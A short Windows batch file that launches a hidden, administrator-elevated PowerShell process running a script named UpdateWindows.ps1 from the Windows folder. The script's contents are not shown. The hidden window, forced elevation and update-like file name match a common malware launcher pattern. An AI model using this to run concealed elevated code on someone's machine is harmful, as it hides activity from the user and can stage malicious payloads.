@echo off
powershell -noprofile -command "&{ start-process powershell -noprofile -windowstyle hidden -ArgumentList '-file C:\Windows\UpdateWindows.ps1 -windowstyle hidden' -verb RunAs}" -windowstyle hidden
exit